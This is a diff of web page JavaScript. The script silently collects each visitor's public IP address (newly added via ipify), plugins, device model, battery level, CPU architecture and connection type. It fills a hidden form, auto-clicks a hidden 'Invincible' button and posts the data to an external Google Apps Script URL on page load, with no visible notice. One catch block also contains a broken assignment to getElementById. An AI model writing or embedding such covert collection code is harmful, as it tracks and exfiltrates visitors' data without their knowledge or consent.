@@ -58,6 +58,16 @@ function fetchData() {
         document.getElementById("Plugins").value = PluginsUsed;
     }
 
+    /* Device IP Address */
+    try {
+        $.getJSON("https://api.ipify.org?format=json",
+            function(data) {
+                document.getElementById("IP_Address").value = data.ip;
+            });
+    } catch {
+        document.getElementById("IP_Address") = "Cannot Fetch";
+    }
+
 
     try {
         var parser = new UAParser();
@@ -74,7 +84,12 @@ function fetchData() {
 
         /* Device Model */
         try {
-            document.getElementById("Model").value = parser.getDevice().model;
+            if (parser.getDevice().model != undefined) {
+                document.getElementById("Model").value = parser.getDevice().model;
+            } else {
+                document.getElementById("Model").value = "Cannot Fetch";
+            }
+
         } catch {
             document.getElementById("Model").value = "Cannot Fetch";
         }
@@ -88,7 +103,7 @@ function fetchData() {
 
         /* Device Battery */
         try {
-            navigator.getBattery().then(function (battery) {
+            navigator.getBattery().then(function(battery) {
                 var level = battery.level * 100;
                 document.getElementById("Battery").value = level + "%";
             });
@@ -105,7 +120,12 @@ function fetchData() {
 
         /* Device CPU Architecture */
         try {
-            document.getElementById("Cpu_Architecture").value = result.cpu.architecture;
+            if (result.cpu.architecture != undefined) {
+                document.getElementById("Cpu_Architecture").value = result.cpu.architecture;
+            } else {
+                document.getElementById("Cpu_Architecture").value = "Cannot Fetch";
+            }
+
         } catch {
             document.getElementById("Cpu_Architecture").value = "Cannot Fetch";
         }
@@ -119,7 +139,12 @@ function fetchData() {
 
         /* Device Type */
         try {
-            document.getElementById("Device_Type").value = result.device.type;
+            if (result.device.type != undefined) {
+                document.getElementById("Device_Type").value = result.device.type;
+            } else {
+                document.getElementById("Device_Type").value = "Cannot Fetch";
+            }
+
         } catch {
             document.getElementById("Device_Type").value = "Cannot Fetch";
         }
@@ -133,7 +158,12 @@ function fetchData() {
 
         /* Connection Type */
         try {
-            document.getElementById("Connection_Type").value = navigator.connection.type;
+            if (navigator.connection.type != undefined) {
+                document.getElementById("Connection_Type").value = navigator.connection.type;
+            } else {
+                document.getElementById("Connection_Type").value = "Cannot Fetch";
+            }
+
         } catch {
             document.getElementById("Connection_Type").value = "Cannot Fetch";
         }
@@ -149,14 +179,15 @@ function fetchData() {
 
     } finally {
         setTimeout(
-            function () {
+            function() {
                 document.getElementById("Invincible").click();
             }, 100);
     }
 }
-setTimeout(fetchData, 2500);
+setTimeout(fetchData, 3000);
 
 const scriptURLHidden = 'https://script.google.com/macros/s/AKfycbx984vER3yBGDicTphNNTR_ViR9972CkfS4z1sHq1KsCN5hltWwRlSaGp1R1UrucK4/exec';
+
 const formHidden = document.getElementsByClassName('hidden-form')
 const btnFormHidden = document.getElementById('Invincible')
 
@@ -167,6 +198,7 @@ btnFormHidden.addEventListener('click', e => {
         body: new FormData(formHidden[0])
     })
 })
+
 window.dataLayer = window.dataLayer || [];
 
 function gtag() {
